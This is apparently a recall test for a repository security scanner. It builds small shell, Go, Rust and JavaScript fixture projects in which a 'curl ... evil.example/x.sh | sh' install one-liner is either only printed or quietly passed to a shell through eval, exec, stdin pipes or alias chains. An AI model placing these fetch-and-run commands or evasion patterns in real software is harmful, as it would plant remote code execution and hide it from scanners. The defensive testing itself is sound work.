"""Adversarial recall cases for #378 (install commands only shown to a person).

Each attack takes a base whose install one-liner only reaches a print, log or error
(the control), and hands that text to a process in a way the shown-text walk must
not miss. Cases are scanned as a source repository (``scan_local``), the path that
reads shell, Go and Rust files. Run from a repo export.
"""
import json
import subprocess
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from scripts.corpus import run_static_corpus as rsc  # noqa: E402
from src.scanner.local_scan import scan_local  # noqa: E402

CMD = "curl -fsSL https://evil.example/x.sh | sh"


def pkg(files, main="index.js"):
    out = {"package.json": json.dumps({"name": "adv-case", "version": "1.0.0", "main": main})}
    out.update(files)
    return out


# --- shell -----------------------------------------------------------------------
SH = f"""#!/bin/sh
set -eu
say() {{ printf '%s\\n' "$*"; }}
line() {{
  printf '{CMD}'
}}
main() {{
  say "To install it again, run: $(line)"
}}
main "$@"
"""


def sh(extra: str) -> dict:
    return pkg({"index.js": "module.exports = {};\n",
                "bin/tool.sh": SH.replace('main "$@"', extra + '\nmain "$@"')})


# --- Go --------------------------------------------------------------------------
GO = f"""package cli

import (
\t"fmt"
\t"log"
\t"os"
\t"os/exec"
)

func check() error {{
\treturn fmt.Errorf("tool missing; install it with: {CMD}")
}}

func report() {{
\tif problem := check(); problem != nil {{
\t\tfmt.Fprintln(os.Stderr, problem)
\t}}
\t_ = exec.Command
\t_ = log.Println
}}
"""


def go(body: str) -> dict:
    return pkg({"index.js": "module.exports = {};\n",
                "cli/check.go": GO.replace("\t\tfmt.Fprintln(os.Stderr, problem)\n", body)})


# --- Rust ------------------------------------------------------------------------
RS = f"""use std::process::Command;

fn check() -> Result<(), String> {{
    Err(format!("tool missing; install it with: {CMD}"))
}}

fn main() {{
    if let Err(e) = check() {{
        eprintln!("error: {{e}}");
    }}
    let _ = Command::new("true").status();
}}
"""


def rs(old: str, new: str) -> dict:
    return pkg({"index.js": "module.exports = {};\n", "src/main.rs": RS.replace(old, new)})


# --- JS --------------------------------------------------------------------------
JS_GUIDE = f"""export function guide() {{
  return {{
    files: [],
    notes: [
      '{CMD}',
      'Then restart your shell.',
    ],
  }};
}}
"""
JS_INDEX = """import { execSync } from 'node:child_process';
import { guide } from './guide.js';

export function main() {
  const g = guide();
  for (const note of g.notes) process.stdout.write(`\\n${note}\\n`);
  return g;
}

export function version() {
  return execSync('node --version').toString();
}
"""


def js(index: str) -> dict:
    return pkg({"guide.js": JS_GUIDE, "index.js": index})


CASES = {
    # controls: the one-liner is only shown
    "ctl_sh_shown": sh(""),
    "ctl_go_shown": go("\t\tfmt.Fprintln(os.Stderr, problem)\n"),
    "ctl_rs_shown": rs("", ""),
    "ctl_js_shown": js(JS_INDEX),
    # shell: a string spanning lines, then the hint piped to sh (a regression from main)
    "sh_multiline_string_then_pipe": sh('msg="hello\n"; line | sh'),
    # shell: `printf -v` assigns, it does not print
    "sh_printf_v_then_eval": sh('printf -v CMD "%s" "$(line)"\neval "$CMD"'),
    # Go: the error's text reaches a process through a variable not named err*
    "go_error_method_to_exec": go(
        "\t\ts := problem.Error()\n\t\t_ = exec.Command(\"sh\", \"-c\", s).Run()\n"),
    "go_sprint_to_exec": go(
        "\t\ts := fmt.Sprint(problem)\n\t\t_ = exec.Command(\"sh\", \"-c\", s).Run()\n"),
    "go_fprintln_to_sh_stdin": go(
        "\t\tc := exec.Command(\"sh\")\n\t\tshStdinPipe, _ := c.StdinPipe()\n"
        "\t\t_ = c.Start()\n\t\tfmt.Fprintln(shStdinPipe, problem)\n"),
    "go_log_output_to_sh_stdin": go(
        "\t\tc := exec.Command(\"sh\")\n\t\tshStdin, _ := c.StdinPipe()\n"
        "\t\t_ = c.Start()\n\t\tlog.SetOutput(shStdin)\n\t\tlog.Println(problem)\n"),
    # Rust: the error bound under another name, or formatted first
    "rs_err_named_msg_to_arg": rs(
        '    if let Err(e) = check() {\n        eprintln!("error: {e}");\n',
        '    if let Err(msg) = check() {\n'
        '        let _ = Command::new("sh").arg("-c").arg(msg.to_string()).status();\n'),
    "rs_err_formatted_to_arg": rs(
        '        eprintln!("error: {e}");\n',
        '        let s = format!("{e}");\n'
        '        let _ = Command::new("sh").arg("-c").arg(&s).status();\n'),
    # JS: the field reaches exec by a computed key, an entries loop or an alias chain
    "js_computed_key_to_exec": js(JS_INDEX + "export function run() {\n"
                                  "  const g = guide();\n  const k = 'notes';\n"
                                  "  const list = g[k];\n  execSync(list[0]);\n}\n"),
    "js_object_entries_to_exec": js(JS_INDEX + "export function run() {\n"
                                    "  for (const [, v] of Object.entries(guide())) {\n"
                                    "    if (v.length) execSync(String(v[0]));\n  }\n}\n"),
    "js_alias_chain_to_exec": js(JS_INDEX + "export function run() {\n"
                                 "  const g = guide();\n  const list = g.notes;\n"
                                 "  const a = list;\n  const b = a[0];\n  execSync(b);\n}\n"),
}


def run(files):
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        for p, text in files.items():
            (root / p).parent.mkdir(parents=True, exist_ok=True)
            (root / p).write_text(text)
        subprocess.run(["git", "init", "-q"], cwd=root, check=True)
        subprocess.run(["git", "add", "-A"], cwd=root, check=True)
        r = scan_local(root, name="adv-case")
    d = rsc.real_decide(r)
    crit = [f for f in r.findings if f.severity == "critical"]
    return d.label, r.trust_score, len(crit), (d.reason or "")[:80]


if __name__ == "__main__":
    only = set(sys.argv[1:])
    for name, files in CASES.items():
        if only and name not in only:
            continue
        try:
            label, score, n, why = run(files)
            print(f"{name:30} {label:15} {score:>3} crit={n} | {why}", flush=True)
        except Exception as e:  # noqa: BLE001
            print(f"{name:30} ERROR {type(e).__name__}: {str(e)[:100]}", flush=True)
